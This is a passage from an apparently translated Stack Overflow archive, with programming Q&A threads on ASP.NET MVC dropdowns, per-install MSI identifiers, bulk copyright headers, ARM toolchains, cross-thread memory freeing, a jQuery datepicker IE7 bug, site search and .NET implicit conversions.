<%= Html.TextBox("MyTextBox", ViewData.Model.MyTextBox) %> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-25T14:32:44.957

创建 SelectList 集合时，尝试在控制器操作中设置选定的值。

ViewData["AddressTypeId"] = new SelectList(CustomerService.AddressType_List(), "AddressTypeId", "Name", **myItem.AddressTypeId** );

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2010-12-11T16:49:16.953

我在这里显然迟到了。但我想添加此评论以防其他人遇到此问题。

在 MVC 2 中。您可以执行以下操作来选择项目...

```
public ActionResult Edit(int id)
        {
            Team team = _db.TeamSet.First(m => m.TeamID == id);
            var fanYear = from c in _db.FanYearSet select c;
            ViewData["FantasyYear"] = new SelectList(fanYear, "YearID", "FantasyYear", team.FanYearReference.EntityKey.EntityKeyValues[0].Value);
            var league = from c in _db.LeagueSet select c;
            ViewData["League"] = new SelectList(league, "LeagueID", "League_Name", team.LeaguesReference.EntityKey.EntityKeyValues[0].Value);

            return View(team);
        } 
```

第四个参数接受一个值，并将在下拉列表中选择您想要的值。在我的示例中，我有一个名为 team 的表，并且我将关系设置为一个名为 fanYear 和 League 的表。

你可以看到我首先得到了我正在编辑的球队，然后建立了一个梦幻年的下拉列表和另一个联赛的下拉列表。为了确定球队的年份和联赛，我不得不使用实体参考。

只是想把它放在那里。我找不到任何这样做的例子。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2009-10-27T12:05:25.063

好的，我可能会从这个线程中遗漏一些东西，但是在 C# 中，以下工作：

```
Html.DropDownList("ProfessionGuid", (SelectList)ViewData["Professions"]) 
```

其中 ' `ProfessionGuid`' 是要在列表中选择的值。

在 VB.Net 我相信它会是：

```
Html.DropDownList("ProfessionGuid", ViewData["Professions"] AS SelectList) 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2010-04-09T21:11:35.210

当您遇到无效或空 ViewData 问题时，请注意控制器的操作。

假设您有一个名为 MyList 的 ViewData 用于 Html.DropDownlist，名为 MyList。

如果您致电`ModelState.AddModelError("MyList","Please select the profession")`，您将使用此警告文本替换您的 ViewData 列表内容。

这也是为什么互联网上的人们对 DropDownList 上的 ViewData 有空问题的原因。

最重要的是，请注意您在错误模型上的 ID，它们不得干扰您的 html 控件。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2010-09-15T20:42:16.670

我对此的担忧是您只能将列表用于一个字段。我有多个用户字段的实体，所以我使用以下内容：

```
< %= Html.DropDownList("fieldAAA", 
                       new SelectList( (IEnumerable) ViewData["Users"], "Value", "Text", fieldAAA))

%> 
```

# c# - 每个应用程序部署的唯一“代码”

> ID：390087
> 
> 赞同：2
> 
> 时间：2008-12-23T21:12:12.217
> 
> 标签：c#, winforms

我们正在开发一个要部署到某些用户机器上的 WinForm 应用程序。我们希望使用某种“代码”来唯一地标识每个安装的应用程序，我们可以在安装到他们的系统上之前定义这些“代码”。

现在我们计划将唯一代码（我们自己键入）放在一个 xml 或文本文件中，并让应用程序在安装时读取它。该应用程序将在安装后删除该文件并将其保存在某处。

我们希望能够自己键入该代码，以便我们可以跟踪，但是这样做是否比将其放入某种平面文件并让应用程序在安装后将其删除更好？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-23T22:48:55.843

如果您使用 MSI 安装应用程序，您可以编辑每个 MSI 以包含特殊代码并将其作为安装的一部分写入注册表。

您可以使用 ORCA 手动编辑 MSI - 您甚至可以使用脚本来访问 MSI 并更改其中的值，这样您就可以编写一个小型应用程序来完成这部分工作。

否则，您可以将其加密到配置文件本身并在启动时输入。

如果没有更多信息，在这里提供帮助非常棘手。

我使用这个脚本 (WiRunSQL.vbs) 来访问 MSI

```
' Windows Installer utility to execute SQL statements against an installer database
' For use with Windows Scripting Host, CScript.exe or WScript.exe
' Copyright (c) 1999-2001, Microsoft Corporation
' Demonstrates the script-driven database queries and updates
'
Option Explicit

Const msiOpenDatabaseModeReadOnly = 0
Const msiOpenDatabaseModeTransact = 1

Dim argNum, argCount:argCount = Wscript.Arguments.Count
If (argCount < 2) Then
    Wscript.Echo "Windows Installer utility to execute SQL queries against an installer database." &_
        vbLf & " The 1st argument specifies the path to the MSI database, relative or full path" &_
        vbLf & " Subsequent arguments specify SQL queries to execute - must be in double quotes" &_
        vbLf & " SELECT queries will display the rows of the result list specified in the query" &_
        vbLf & " Binary data columns selected by a query will not be displayed" &_
        vblf &_
        vblf & "Copyright (C) Microsoft Corporation, 1999-2001\.  All rights reserved."
    Wscript.Quit 1
End If

' Scan arguments for valid SQL keyword and to determine if any update operations
Dim openMode : openMode = msiOpenDatabaseModeReadOnly
For argNum = 1 To argCount - 1
    Dim keyword : keyword = Wscript.Arguments(argNum)
    Dim keywordLen : keywordLen = InStr(1, keyword, " ", vbTextCompare)
    If (keywordLen) Then keyword = UCase(Left(keyword, keywordLen - 1))
    If InStr(1, "UPDATE INSERT DELETE CREATE ALTER DROP", keyword, vbTextCompare) Then
        openMode = msiOpenDatabaseModeTransact
    ElseIf keyword <> "SELECT" Then
        Fail "Invalid SQL statement type: " & keyword
    End If
Next

' Connect to Windows installer object
On Error Resume Next
Dim installer : Set installer = Nothing
Set installer = Wscript.CreateObject("WindowsInstaller.Installer") : CheckError

' Open database
Dim databasePath:databasePath = Wscript.Arguments(0)
Dim database : Set database = installer.OpenDatabase(databasePath, openMode) : CheckError

' Process SQL statements
Dim query, view, record, message, rowData, columnCount, delim, column
For argNum = 1 To argCount - 1
    query = Wscript.Arguments(argNum)
    Set view = database.OpenView(query) : CheckError
    view.Execute : CheckError
    If Ucase(Left(query, 6)) = "SELECT" Then
        Do
            Set record = view.Fetch
            If record Is Nothing Then Exit Do
            columnCount = record.FieldCount
            rowData = Empty
            delim = "  "
            For column = 1 To columnCount
                If column = columnCount Then delim = vbLf
                rowData = rowData & record.StringData(column) & delim
            Next
            message = message & rowData
        Loop
    End If
Next
If openMode = msiOpenDatabaseModeTransact Then database.Commit
If Not IsEmpty(message) Then Wscript.Echo message
Wscript.Quit 0

Sub CheckError
    Dim message, errRec
    If Err = 0 Then Exit Sub
    message = Err.Source & " " & Hex(Err) & ": " & Err.Description
    If Not installer Is Nothing Then
        Set errRec = installer.LastErrorRecord
        If Not errRec Is Nothing Then message = message & vbLf & errRec.FormatText
    End If
    Fail message
End Sub

Sub Fail(message)
    Wscript.Echo message
    Wscript.Quit 2
End Sub 
```

我这样称呼它。

```
wscript D:\Scripts\wirunsql.vbs D:\MSI\msiName.msi "Update ISProductConfigurationProperty Set Value = 'Name of my Product' WHERE (Property = 'ProductName')" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-23T21:22:54.020

在您的 MSI 安装程序中添加一个自定义操作，该操作会即时生成 GUID 并将其存储在注册表中。然后，该程序将在必要时访问该注册表项。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-27T01:02:10.207

我建议您使用 NSIS（Nullsoft 安装系统）进行设置，并在安装脚本中设置一个变量，该变量在安装时保存在注册表中。

NSIS 脚本中的变量可以在编译时使用特殊的命令行开关进行定义。这使得创建轻量级 c# 或 vb.net 应用程序成为可能，该应用程序接受您选择的唯一 ID，并使用嵌入的 ID 构建安装。

这样，只需单击一下即可为客户创建新安装。您还可以将 .NET 构建应用程序连接到 SQL Express 数据库（或等效数据库）并自动保存客户 ID 以供以后使用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-23T21:17:52.597

就个人而言，如果我要编写这样的方案，我将拥有一个服务器，应用程序将在第一次运行时对其进行检查。服务器将为计算机生成一个 ID（可能是 GUID），然后客户端应用程序将保存该 ID。

如果使用这样的方案，在安装时手动执行此操作可能不太可能，但如果这是手动执行此操作的唯一原因，则服务器没有理由无法保留为您安装应用程序的计算机目录。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-23T21:21:01.123

您可以使用主网卡的 MAC ID、系统驱动器的序列号或它们的某种组合。如果您可以完全控制用户的机器，那么 CPUID 也可能是合适的。

这取决于您对用户的信任程度。如果 ID 主要用于识别，则上述方法将起作用。如果它是用于某种安全系统或包含附加信息（例如，要打开应用程序中的哪些功能），那么某种基于服务器或基于 Active Directory 的解决方案（假设是 Intranet 环境）可能会更好。

# visual-studio - 向 Visual Studio 解决方案中的每个代码文件添加相同的注释

> ID：390095
> 
> 赞同：2
> 
> 时间：2008-12-23T21:21:57.003
> 
> 标签：visual-studio, tfs, comments

背景：我们正在使用 VS 2008，并且正在从 TFS 2005 升级到 2008。

我们有一个包含多个项目的解决方案，并且总体上有数百个代码文件。我们想为所有这些文件添加相同的文本作为评论（版权信息）。有谁知道快速/简单/有效的方法来做到这一点？另外，有没有办法通过 TFS 做到这一点，所以我们没有签出和签入每个文件？

我在 CodeProject 上找到了一些关于创建执行此操作的宏的代码，但是您必须单独打开每个文件，然后在每个文件上运行宏，这是我们希望避免的。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-23T21:28:15.773

对于你们来说，编写一个遍历所有目录和所有代码文件（假设 *.cs 等）并将文本添加到顶部的简单程序应该是微不足道的。

构建、测试和运行它应该花费不到 20 分钟的时间。

就 TFS 而言，只需从树的顶部执行 checkout 命令。它将检查源代码控制中的每个文件。完成后，您也可以从顶部签入。

假设 C#，看看 System.IO.Directory.GetDirectories()...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-23T21:30:18.030

如果您安装了[Cygwin](http://www.cygwin.org)，则可以使用以下 Bash 脚本：

```
# Process all .cpp and .h files under the directory tree at $PROJECTROOT
# To add other file types, add more "-o -name \*.ext" clauses.
# $COPYRIGHTFILE is the file containing your copyright message
COPYRIGHTLENGTH=$(wc -l $COPYRIGHTFILE)
for file in $(find $PROJECTROOT -name \*.cpp -o -name \*.h); do
    if diff <(head -n $COPYRIGHTLENGTH $file) $COPYRIGHTFILE; then
        (cat $COPYRIGHTFILE; cat $file) > /tmp/file
        mv /tmp/file $file
    fi
done 
```

这将查找目录树 $PROJECTROOT 下的每个 .cpp 或 .h 文件，将开头与版权消息进行比较，如果不同，则通过临时文件将版权添加到文件中。

免责声明：未经测试，请先测试并自行承担使用风险。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-09-08T18:05:15.243

我[发布的代码](http://rexcardan.com/codesnippets/adding-a-copyright-to-visual-studio-project)完全符合您在 20 行中尝试完成的任务。

该代码的参考如下：

```
static void Main(string[] args)
{
    string path = "C:\\...TopLevelFolder";
    string copyright = "//Copyright © 2011 Rex Cardan, Ph.D";
    string[] files = Directory.GetFiles(path, "*.cs", SearchOption.AllDirectories);
    foreach (string file in files)
    {
        if (file.Split('\\')[file.Split('\\').Length-1]!= "AssemblyInfo.cs")
        {
            using (StreamWriter sw = File.AppendText(file))
            {
                sw.WriteLine("\r\n");
                sw.WriteLine(copyright);
                //Normalize Line Endings
                sw.WriteLine("\r\n");
            }
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-29T06:49:59.253

> [我]有没有办法通过 TFS 做到这一点，所以我们没有签出和签入每个文件？

将此更改作为文件更改历史记录的一部分是个好主意。因此，您**确实**想要签出并签入所有文件。

Kevin Pilch-Bisson 的博客文章“[在解决方案中格式化所有 C# 文件](http://blogs.msdn.com/kevinpilchbisson/archive/2004/05/17/133371.aspx)”是一个很好的资源。您可以修改该算法以进行编辑。

# embedded - arm-linux-gcc 与 arm-elf-gcc

> ID：390099
> 
> 赞同：5
> 
> 时间：2008-12-23T21:24:10.057
> 
> 标签：embedded, arm, gnu-toolchain, uclinux

我正在查看使用 arm-linux-xxx 构建内核的 uClinux 系统，但使用 arm-elf-xxx 构建用户应用程序。

如果这些应用程序旨在在 linux 上运行，那么使用 arm-linux-xxx 构建所有内容不是更好吗？

在整个 uClinux 构建配置中在哪里设置该选项？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2010-01-08T16:49:40.403

编译器的名称并不一定意味着什么。根据谁构建了编译器（并命名它们），你会得到不同的结果。可以说，特定配置有一个正确的名称，但一些随机编译的 gcc 可能不正确。

对于 CodeSourcery 编译器（可能是最正确的名称），请参阅[他们的平台页面](http://www.codesourcery.com/sgpp/platforms.html)以了解其命名的含义。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-03-29T09:01:10.293

您可以运行`arm-linux-gcc -v`并`arm-elf-gcc -v`查看这两个 gcc 版本之间的一些差异（例如目标体系结构/语言）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-29T14:37:07.137

我似乎记得在某个时候，中间的那一点无关紧要。正如已经提到的 elf 是标准文件格式，无论如何你都想使用它，并且无论如何都会得到它独立于二进制名称。可能（或不）更重要的是调用约定，我不知道在调用共享库函数时是否必须使调用约定匹配，或者是否在其他地方为您处理。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-23T21:28:46.630

[ELF 是linux](http://en.wikipedia.org/wiki/Executable_and_Linkable_Format)的二进制格式，许多其他人使用：

> ELF 格式在许多类 Unix 操作系统（如 Linux、Solaris、IRIX、FreeBSD、NetBSD、OpenBSD、DragonFly BSD、Syllable 和 HP-UX 除外）中取代了旧的可执行格式，如 a.out 和 COFF（32-位 PA-RISC 程序继续使用 SOM）。ELF 也被一些非 Unix 操作系统采用，例如 OpenVMS 的 Itanium 版本，以及基于 x86 的计算机的 BeOS Revision 4 及更高版本（它取代了 Portable Executable 格式；PowerPC 版本保留了 Preferred Executable Format）。PlayStation Portable、PlayStation 2、PlayStation 3、Wii 和 GP2X 游戏机也使用 ELF。AmigaOS 4 和 MorphOS 也在 PowerPC 机器上运行，使用 ELF。在 Amiga 平台上，ELF 可执行文件取代了以前在配备 PPC 处理器扩展卡的 Amigas 上使用的 EHF（扩展块格式）。Symbian OS v9 使用基于 ELF 文件格式的 E32Image[3] 格式。
> 
> 大多数索尼爱立信（例如，W800i、W610、K790 等），一些西门子（SGOLD 和 SGOLD2 平台：从西门子 C65 到 S75 和明基西门子 E71/EL71）和摩托罗拉（例如，E398、SLVR L7 、v360、v3i 和所有手机 LTE2 都应用了补丁）手机可以通过使用将汇编代码添加到主固件（在地下改装文化中称为 ELFPack）的补丁来运行 ELF 文件。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-12-03T05:10:49.570

不同之处在于 arm-elf-xxx 工具链的链接输出是一个 linux 可加载二进制文件，而 arm-linux-xxx 输出一个内核对象 (ko)，它是一个具有自己链接格式的 blob（用于模块），或者主内核本身，不需要打包格式。即，对于用户空间，您希望最终的动态链接对象是 ELF 可执行文件、库或共享对象。对于内核空间，您希望最终对象（内核或模块）采用 linux-arm-kernel 链接格式。

您会注意到两个目标的中间对象（.o 文件）可能都是 ELF，因为这是工具链所期望的。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-08-19T04:35:15.367

在我们的例子中，我们使用 sparc-elf-gcc 构建 linux，我们使用 sparc-..-linux-gcc 构建busybox（在 linux 上运行的应用程序）。我认为这是正确的，而不是相反。

# .net - MVC pattern in .NET: Can View call Exceptions in Model?

> ID：390100
> 
> 赞同：2
> 
> 时间：2008-12-23T21:24:46.950
> 
> 标签：.net, winforms, model-view-controller, design-patterns

I'm using the MVC pattern in a .NET winform app. There are places in the Controller that can cause an exception. Rather than catching the exception and dislpaying a messagebox, which is a View responsibility, I do nothing in the Controller and let the View wrap that area in a try/catch. So far, there isn't anything that needs to be done in these exceptions except display a nice message to the user. That won't always be the case. The View than displays the exception error in a messagebox. I don't like this because the Exception classes come from the model. So, the View is reaching directly into the Model to gain access to the exceptions. But, how else can it be done and still follow the MVC pattern?

I could have the Controller handle the exception and throw a string back to the UI. How is that done though? If functionA returns void, I don't want to modify its return type just to appaise the View.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-11-06T01:57:30.030

I feel that its the Controllers responsiblity to tell the view to show a message and what message to show.

Therefor, I would put a DisplayError(string) method on the view and call that when you catch the exception in the Controller. That way the controller does the exception handling that the view still manages the details of displaying a message box with the message I tell it to use.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-23T21:30:11.463

Typically what I do is have the Presenter (Controller) expose an OnError event that the View listens to. The view then uses the info from that event to present a UI, update a status bar or whatever.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-24T01:04:05.370

I couldn't completely get away from this since I use Generic Events. I'm using the event model for Exceptions but the events are generic. That requires the caller to know about your generic event. Still, that all comes through via intellisense in the View and still makes the View very stupid :)

# c++ - 跨线程的内存分配和释放

> ID：390102
> 
> 赞同：5
> 
> 时间：2008-12-23T21:26:00.223
> 
> 标签：c++, multithreading, memory

我仍在尝试调试一个非常狡猾的内存损坏问题。我遇到了一段代码，它在一个线程上分配内存并在另一个线程上删除它。

我有一种模糊的感觉，这是错误的，但我不知道为什么。线程共享进程内存并且对这些结构的访问受到互斥锁的保护，所以我认为一切都会正常工作。但是，有没有我没有看到的危险？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-23T21:48:26.170

正如@monjardin 的另一个答案所示，您尝试做的事情本质上没有任何问题。

作为一个额外的想法，你没有提到你遇到这个问题的平台等，但是如果多线程对你来说是新的和/或你正在处理的这个应用程序，你要确保标准支持您正在使用的库是这些库的线程安全版本。在许多环境/平台中，它们同时具有可供开发人员使用的支持库的单线程和多线程版本。如果您使用线程但链接到库的单线程版本，可能会发生很多不好的事情。例如，在*malloc()*和*free()的单线程支持库中*它不会为堆提供互斥保护（作为优化）。该库的多线程版本将为堆管理器添加互斥锁保护，以支持一次操作堆的多个线程。（这只是一个例子）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-23T21:56:10.413

不，这很好，而且很常见，尤其是在使用 CreateThread 的 Windows 编程中，您可以在堆上分配参数，并将参数作为 void * 参数传递给 CreateThread。最简单的做法是让被调用的线程在处理完参数后删除它的参数。但是，如果您遇到内存损坏问题，并且您担心一个线程删除另一个创建的内存，也许您应该考虑是否发生双重删除，例如现在负责清理分配的上下文的传输记忆不清楚，也许调用和被调用部分都在做呢？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-23T22:36:23.560

请记住，内存管理器本身也必须是线程安全的，而不仅仅是您对内存的使用。检查您的平台文档。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-23T21:29:50.760

危险在于多线程代码更难编写。但是，如果程序是正确的，那么应该没有问题。**[这可能是生产者/消费者](http://en.wikipedia.org/wiki/Producer-consumer_problem)**模式中的常见情况，其中生产线程分配内存，该内存放置在**[同步队列](http://www.c-sharpcorner.com/UploadFile/mgold/QueueInThread11222005232529PM/QueueInThread.aspx)**中并由消费线程释放。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-23T21:38:22.210

只要内存的分配和释放得到适当的保护*，并且*您还确保结构仅在它们位于同一个互斥锁下时才被访问，我真的看不出这是一个问题。请注意，这适用于读取和写入访问，而不仅仅是写入访问，因为您需要确保结构在有人从中读取数据时保持在原位。

是否有可能某处的某些代码试图在互斥保护之外访问这些数据结构？或者更糟糕的是，这些结构中的一些有可能成为 C++ 对象生命周期考虑的牺牲品（例如，它们被销毁是因为它们是通过 boost::shared_ptrs 引用的，并且最后一个 shared_ptr 刚刚退出建筑物？

您是否 100% 确定这是内存损坏？另一个看起来非常相似的错误是，某些代码保留了不应保留的引用，并且引用的对象由于内存重新分配而被移动。这并不是一个奇怪的场景，因为向向量中添加另一个元素会触发这种情况（仅举个例子）。

# asp.net - 更改嵌套 ListView 的 LayoutTemplate 中的项目

> ID：390103
> 
> 赞同：0
> 
> 时间：2008-12-23T21:26:30.970
> 
> 标签：asp.net, listview, nested

这与我[之前的问题有关](https://stackoverflow.com/questions/390017/hide-a-table-column-in-a-nested-listview)，但我想我会简化它并从中提出挑战。给定下面的代码，您可以从后面的代码中更改“ChangeThisLabel”的值吗？

```
<asp:ListView ID="OuterListView" runat="server">
    <LayoutTemplate>
        <asp:PlaceHolder ID="itemPlaceHolder" runat="server" />
    </LayoutTemplate>
    <ItemTemplate>
        <%#Eval("outer_value")%> <br/>
        <asp:ListView ID="InnerListView" runat="server" DataSource='<%#Eval("inner") %>'>
            <LayoutTemplate>
                <asp:Label ID="ChangeThisLabel" runat="server" />
                <asp:PlaceHolder ID="itemPlaceHolder" runat="server" />
            </LayoutTemplate>
            <ItemTemplate>
                <%#Eval("inner_value")%> <br/>
            </ItemTemplate>
        </asp:ListView>
    </ItemTemplate>
</asp:ListView> 
```

我建议在提交答案之前自己尝试一下，因为我在之前的帖子中得到了很多建议，这些建议对于单个 ListView 来说效果很好，但是在遇到嵌套的 ListView 时会掉下来。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-23T21:46:15.503

正如另一个答案中提到的那样。在后面的代码中，在加载时，您可以这样做：

```
`OuterListView.FindControl("InnerListView").FindControl("ChangeThisLabel") 
```

然后将其转换为标签并更改文本。显然，您将在循环内迭代此代码，以便您为每个外部列表视图的内部列表视图中的每个标签执行此操作。

关于您其他问题的答案，您不清楚您是否想从后面的代码中访问它。此外，您可能想发布您尝试过的内容，以便人们知道您尝试过不同的方法。

祝你好运！

编辑：关于您的评论：

> 除非我遗漏了什么，否则这将不起作用，因为“ChangeThisLabel”在由内部 ListView 呈现时变为“ctl00_ctl00_BodyContentPlaceHolder_ReportContentPlaceHolder _OuterListView_ctrl0_InnerListView_ChangeThisLabel”

你是对的，但是当你使用 FindControl(id) 时，它将使用服务器端 id 来查找控件。如果你这样做： InnerListView.FindControl("ChangeThisLabel") 那么它会找到正确的标签，而不管分配给该控件的客户端 ID。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-23T21:29:58.407

在您的 DataBound （或类似的东西）事件处理程序中使用`FindControl("ChangeThisLabel")`来获取对标签的引用。当然，您应该`Label`在使用引用之前强制转换为。

您可能想要编写自己的 FindControl 方法，您将递归调用该方法以查找第 n 级的控件。

# javascript - jQuery UI 日期选择器在 IE7 中不起作用

> ID：390105
> 
> 赞同：8
> 
> 时间：2008-12-23T21:27:31.640
> 
> 标签：javascript, asp.net-mvc, jquery-ui, internet-explorer-7

我终于可以在我的 MVC 演示站点上使用 datepicker 了。有一件事，虽然它在使用 IE7 浏览时不起作用，但我还没有使用 IE6 进行测试。有谁知道如何解决这个问题，或者如果我希望 IE 用户能够选择日期，我不能使用 jQuery 吗？

它在 Safari 和 Firefox 上就像一个魅力，除了它在下拉时的位置。

请在我的演示站点上亲自尝试：[演示站点](http://www.tarsius.se)

单击菜单上的“Boka plats”链接。然后登录：电子邮件：test@test.nu 密码：tester

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2008-12-23T23:20:20.790

如果我没记错的话，您的参数列表中有一个尾随逗号。IE 会一直在 js 中被尾随逗号阻塞。

试试这个：

```
$(function() {            
    $("#Date").datepicker($.extend({},
       $.datepicker.regional["sv"], {
            onSelect: function(date) {
            }, 
            minDate: "0d",
            maxDate: new Date(2009, 3 - 1, 26),
            showStatus: true,
            showWeeks: true,
            highlightWeek: true, 
            showOn: "both",
            numberOfMonths: 1,
            firstDay: 1,
            buttonImage:"../../Content/Images/calendar.gif",
            buttonImageOnly: true,
            showAnim: "scale", 
            showOptions: { 
                origin: ["top", "left"] 
            }
    }));
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-23T21:35:33.013

[这有帮助吗？](https://stackoverflow.com/questions/385269/jquery-ui-datepicker-in-aspnet-mvc)

编辑：是的，我认为您需要将 DatePicker() 包装在 $(document).ready(function() EX 中：

```
<script type="text/javascript"> 
        $(document).ready(function() {          
            $("#Date").datepicker($.extend({},
                $.datepicker.regional["sv"], {
                    onSelect: function(date) {
                        //alert("The chosen date is " + date);
                    }, 
                    minDate: "0d",
                    maxDate: new Date(2009, 3 - 1, 26),
                    showStatus: true,
                    showWeeks: true,
                    highlightWeek: true, 
                    showOn: "both",
                    numberOfMonths: 1,
                    firstDay: 1,
                    buttonImage:"../../Content/Images/calendar.gif",
                    buttonImageOnly: true,
                    showAnim: "scale", 
                    showOptions: { 
                        origin: ["top", "left"] 
                    }, 
                }));
        });   
    </script> 
```

# c# - 如何为我的应用程序构建搜索机制？

> ID：390106
> 
> 赞同：6
> 
> 时间：2008-12-23T21:28:04.120
> 
> 标签：c#, asp.net, sql-server, linq, search

如今，拥有几乎可以搜索您想要的任何内容的搜索功能似乎是一个普遍的要求。任何人都可以给我样本或提示如何构建一个应用程序的一站式搜索？

例如：您有 3 个表客户、产品、员工。该应用程序有一个母版页，其右上角有一个文本框，与您在 stackoverflow 上的非常相似。

我如何搜索“凤凰”一词并获得类似的结果

顾客

```
Result 1
...... 
```

产品

```
Result 1
...... 
```

雇员

```
Result 1
...... 
```

任何提示、教程和提示将不胜感激。我的环境是 Win2k3,.net3.5,C#,ASP.net。

编辑：特别关注性能和可扩展性。

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-23T22:10:16.267

[Lucene.NET](http://incubator.apache.org/lucene.net/)是一个速度极快的全文搜索引擎。

示例用法：

请参阅从[搜索页面的](http://code.google.com/p/dotnetkicks/source/browse/trunk/DotNetKicks/Incremental.Kick.Web.UI/Pages/Story/Search.aspx.cs)代码隐藏开始的[DotNetKicks的](http://www.dotnetkicks.com/)[源代码](http://code.google.com/p/dotnetkicks/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-23T22:43:35.730

如果你想要一些真正可扩展的东西，我想你必须首先构建一个数据字典，列出数据库中的每个表和每一列。这种表的构建可以[完全自动化](https://stackoverflow.com/questions/281979/do-you-generate-your-data-dictionary#283813)。

您将在此表中指明哪些字段可用于直接搜索或软（*带通配符*）搜索。

然后，您将能够构建一些漂亮而智能的用户界面，只要发票编号字段可用于软搜索，机器就可以在其中找到代码，例如`'*823*'`引用`'INV-0823456'`和发票编号。`'INV-0880823'`用户甚至可以选择搜索哪些列，因为扫描数据库中的所有电话号码可能并不总是有意义的。

您不应该尝试索引所有可搜索的列。就磁盘卷\服务器开销而言，“全索引”策略可能会变得非常昂贵，并且对于很少搜索的列并不总是有意义的。不必为此担心太多：用户不会介意延迟得到答案。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-23T21:36:47.613

一种方法是[在数据库的所有表中查找搜索值](http://vyaskn.tripod.com/search_all_columns_in_all_tables.htm)。当然，可以更改此代码以专注于特定的表和列。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-23T21:48:41.830

[Xapian](http://xapian.org/)是一个开源搜索引擎库，[具有](http://xapian.org/features.php)您正在寻找的功能。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-23T22:15:56.003

跟进fall888的回答：

您可以使用一个方法创建一个类，该方法采用一个搜索关键字的数组或列表作为输入。创建与每个表相关的 LINQ 查询，例如，以[本博](http://blogs.microsoft.co.il/blogs/bursteg/archive/2007/10/16/linq-to-sql-like-operator.aspx)文中介绍的某些方式使用“LIKE”运算符来搜索正确的列以查找匹配的内容。当然，这不会很优化，但适用于小型系统:)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-23T23:44:50.473

如果您将 SQL Server 用于您的数据库，那么您可以尝试 SQL 的全文搜索。我已经相当成功地使用了它。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-02-04T15:56:42.347

如果您想要一站式搜索解决方案并希望在几分钟内在您的网站或博客上进行搜索，您可以随时使用[BuildaSearch](http://www.buildasearch.com)。BuildaSearch 使自定义搜索创建快速而简单。只需复制并粘贴您的自定义 javascript 代码，您就可以立即在您的网站上使用功能齐全的自定义搜索。该搜索服务最有趣的特点是您无需编写任何代码，并且可以在任何 Web 服务器环境中工作。

# c# - .Net 隐式转换指南

> ID：390108
> 
> 赞同：3
> 
> 时间：2008-12-23T21:28:29.297
> 
> 标签：c#, types, implicit

关于何时可以、应该或不应该定义用户定义的隐式转换的一般准则是什么？

我的意思是，例如，“隐式转换不应该丢失信息”、“隐式转换不应该抛出异常”或“隐式转换不应该实例化新对象”。我很确定第一个是正确的，第三个不是（或者我们只能隐式转换为结构），我不知道第二个。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2008-12-23T21:45:37.687

第一个并不像你想象的那么简单。这是一个例子：

```
using System;

class Test
{
    static void Main()
    {
        long firstLong = long.MaxValue - 2;
        long secondLong = firstLong - 1;

        double firstDouble = firstLong;
        double secondDouble = secondLong;

        // Prints False as expected
        Console.WriteLine(firstLong == secondLong);

        // Prints True!
        Console.WriteLine(firstDouble == secondDouble);        
    }
} 
```

就我个人而言，我很少创建自己的隐式转换。我对框架中的那些感到很满意，但我很少觉得添加我自己的会让生活变得更好。（顺便说一句，一般的值类型也是如此。）

编辑：只是为了稍微回答一下这个问题，可能值得阅读[Microsoft 类库设计指南中的转换运算符部分](http://msdn.microsoft.com/en-us/library/ms229059.aspx)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-23T21:33:44.513

我绝对同意第一个 - 大多数时候是第二个（“永不言败”），但不会对第三个感到兴奋；除此之外，它在结构和类之间创建了不必要的区别。在某些情况下，隐式转换可以极大地简化调用约定。

对于显式转换，一切皆有可能。

不过，您并不经常需要编写转换运算符。而且在许多情况下，显式运算符更有用，如果条件不正确（例如，`Nullable<T>`如果它们没有值，它们可以中断）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-09-03T23:50:49.917

